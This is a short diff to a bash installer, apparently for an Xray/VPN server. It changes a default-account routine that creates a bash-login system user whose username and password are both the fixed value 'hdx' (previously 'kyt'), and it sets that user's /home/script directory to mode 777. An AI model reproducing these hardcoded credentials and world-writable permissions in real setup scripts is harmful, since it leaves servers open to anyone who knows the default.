@@ -1013,11 +1013,12 @@ clear
     enable_services
 }
 function password_default() {
-domain=$(cat /etc/xray/domain)
+clear
+    domain=$(cat /etc/xray/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     userdel jame > /dev/null 2>&1
-    Username="kyt"
-    Password=kyt
+    Username="hdx"
+    Password=hdx
     mkdir -p /home/script/
     chmod 777 /home/script/
     useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
